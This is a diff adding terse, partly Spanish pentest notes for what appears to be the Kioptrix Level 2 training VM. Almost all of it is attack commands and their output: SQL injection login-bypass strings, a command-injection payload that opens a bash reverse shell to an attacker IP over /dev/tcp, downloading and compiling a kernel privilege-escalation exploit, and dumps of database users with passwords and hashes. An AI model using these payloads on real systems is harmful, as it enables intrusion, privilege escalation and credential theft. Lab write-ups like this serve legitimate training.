@@ -1,0 +1,105 @@
+####################################################################################################################################################################################################################
+1) Enumeration
+OS
+Linux 2.6.9 - Linux 2.6.30
+
+Services
+Puerto 22   - TCP - Servicio SSH        - OpenSSH 3.9p1 (protocol 1.99)
+Puerto 80   - TCP - Servicio HTTP       - Apache httpd 2.0.52 ((CentOS))
+Puerto 111  - TCP - Servicio RPCBIND    - 2 (RPC #100000)
+Puerto 443  - TCP - Servicio SSL/HTTPS  - Apache httpd 2.0.52 ((CentOS))
+Puerto 631  - TCP - Servicio IPP        - CUPS 1.1
+Puerto 111  - TCP - Servicio RPCBIND    - 1 (RPC #100024)
+Puerto 3306 - TCP - Servicio MYSQL      - MySQL (unauthorized)
+
+// Fuzzing de directorios
+wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://192.168.1.17/FUZZ
+
+###################################################################################################################################################################################################################
+
+2. Explotation
+
+1) SQLI + Comand Injection + Linux Kernel 2.6 Privilage Escalation
+
+!!!!! Encuentro un SQLI
+// Fuzzing con ZAP de diccionario de SQLI
+admin' OR 1=1#
+' or 1=1-- '
+
+!!!!! Encuentro un Comand Injection
+// Comand injection
+nc -nlvp 8088
+127.0.0.1; bash -i>&/dev/tcp/192.168.1.11/8088 0>&1
+// Mas informacion
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+
+
+!!!!! Escalo privilegios
+// Miro la version del Kernel
+bash-3.00$ uname -a
+Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
+bash-3.00$ uname -r
+2.6.9-55.EL
+// Busco esa version de Kernel y encuentro este exploit
+https://www.exploit-db.com/exploits/9542/
+// Solo puedo escibir en tmp
+cd /tmp/
+wget https://www.exploit-db.com/download/9542
+mv 9542 9542.c
+gcc -o Ring0 9542.c
+./Ringo
+
+
+###################################################################################################################################################################################################################
+
+3. Information Gathering
+
+// Information gathering
+mysql_connect("localhost", "john", "hiroshima") or die(mysql_error());
+
+// Consigo shell interactiva
+python -c 'import pty;pty.spawn("/bin/bash")'
+// Accedo a la DB
+mysql -u john -p
+Enter password: hiroshima
+
+// Select DB
+show databases
+use webapp
+show tables
+
+// Show users
+select * from users;
++------+----------+------------+
+| id   | username | password   |
++------+----------+------------+
+|    1 | admin    | 5afac8d85f |
+|    2 | john     | 66lajGGbla |
++------+----------+------------+
+
+// Select DB
+use mysql
+
+// Show users
+mysql> select * from user;
+select * from user;
++-----------------------+------+------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+
+| Host                  | User | Password         | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections |
++-----------------------+------+------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+
+| localhost             | root | 5a6914ba69e02807 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                |          |            |             |              |             0 |           0 |               0 |
+| localhost.localdomain | root | 5a6914ba69e02807 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                |          |            |             |              |             0 |           0 |               0 |
+| localhost.localdomain |      |                  | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                |          |            |             |              |             0 |           0 |               0 |
+| localhost             |      |                  | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                |          |            |             |              |             0 |           0 |               0 |
+| localhost             | john | 5a6914ba69e02807 | Y           | Y           | Y           | Y           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                |          |            |             |              |             0 |           0 |               0 |
++-----------------------+------+------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+
+5 rows in set (0.00 sec)
+
+
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+https://www.exploit-db.com/exploits/11650/
+g++ ? windows.h?
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
